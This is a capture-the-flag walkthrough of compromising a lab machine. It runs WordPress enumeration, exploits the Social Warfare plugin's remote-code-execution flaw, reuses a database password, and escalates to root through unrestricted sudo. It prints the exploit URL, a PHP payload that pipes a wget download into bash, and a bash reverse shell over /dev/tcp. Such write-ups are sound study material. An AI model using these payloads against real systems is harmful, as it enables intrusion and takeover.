# Enumeration
As always, Starting with nmap.
```bash
Nmap scan report for 192.168.166.123
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:b7:db:e0:ba:63:76:af:d0:20:03:11:e1:3c:0e:34 (RSA)
|   256 2e:20:56:75:84:ca:35:ce:e3:6a:21:32:1f:e7:f5:9a (ECDSA)
|_  256 0d:02:83:8b:1a:1c:ec:0f:ae:74:cc:7b:da:12:89:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Looking at results, we have port 22 and 80 open.

## Port 80
The site just a had a message,
```
remember: your goal is not just to get root shell, your goal is to read root.txt is part of the challenge. Have fun! :D
```
Running *ffuf* for directory brute-forcing.
```bash
ffuf -u http://192.168.166.123/FUZZ -w /usr/share/wordlists/dirb/big.txt -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.166.123/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 57, Words: 10, Lines: 3]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
wordpress               [Status: 301, Size: 322, Words: 20, Lines: 10]
```

We found a directory named `/wordpress`. Browsing the directory reveals as simple wordpress site.
![image](https://user-images.githubusercontent.com/43528306/124246794-dc92de00-db3e-11eb-9ad2-e22485108322.png)


### Wordpress
Now we have to enumerate the wordpress site. The best tool for this task in our arsenal is `wpscan`. Running wpscan against our target
```bash
...[snip]...

[i] Plugin(s) Identified:

[+] social-warfare
 | Location: http://192.168.166.123/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-05-17T19:38:00.000Z
 | [!] The version is out of date, the latest version is 4.2.1
 |
 | [!] Title: Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
 |     Fixed in: 3.5.3
 |     References:
 |      - https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618
 |      - https://www.webarxsecurity.com/social-warfare-vulnerability/

...[snip]...
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.166.123/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
 
...[snip]...
```
Looking at the results, we saw one of the plugin `social-warfare` used is vulnerable to RCE. Wpscan also provided us with references to explore more about the  vulnerability.

## Expoiting
From the [blogpost](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618), we can use the following steps to exploit it.
- We need to host a file containing our payload.
- Visit `<target>/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://<Attacker>/payload.txt`

And we'll get the results. Using this we can get reverse shell.

#### Reverse Shell
We'll host our payload file using python http server with a single command `python3 -m http.server 8080`. 
```php
// Our payload file
<pre>
system('wget -O - http://192.168.49.166:8080/shell.sh | bash')
</pre>
```
Here, In our paylaod file we are making a GET request to our box again, asking for `shell.sh`, and instead of writing it to disk, 
we are directly piping it to bash which results in execution of the contents.


##### Content of Shell.sh 
```bash
bash -c "bash -i >& /dev/tcp/192.168.49.166/9991 0>&1"
```

## Shell as www-data
We got shell as `www-data`.
```bash
www-data@wpwn:/var/www/html/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Checking the `wp-config` file, we got a potential password.
```php
define( 'DB_NAME', 'wordpress_db' );                                                                                                                                     
                                                                                                                                                                         
/** MySQL database username */
define( 'DB_USER', 'wp_user' );
                                          
/** MySQL database password */     
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );
                                                                                    
/** MySQL hostname */                                                               
define( 'DB_HOST', 'localhost' );
```
As there was a single user on the box `takis`, we can use this password and it worked. We got shell as *takis*

## Shell as Takis
Checking privileges of takis.
```bash
takis@wpwn:~$ sudo -l
Matching Defaults entries for takis on wpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User takis may run the following commands on wpwn:
    (ALL) NOPASSWD: ALL
```
We were allowed to run every command as root. Here we can easily switch to root using `sudo -s`.
```bash
takis@wpwn:~$ sudo -s
root@wpwn:/home/takis# id
uid=0(root) gid=0(root) groups=0(root)
```

ROOT!!
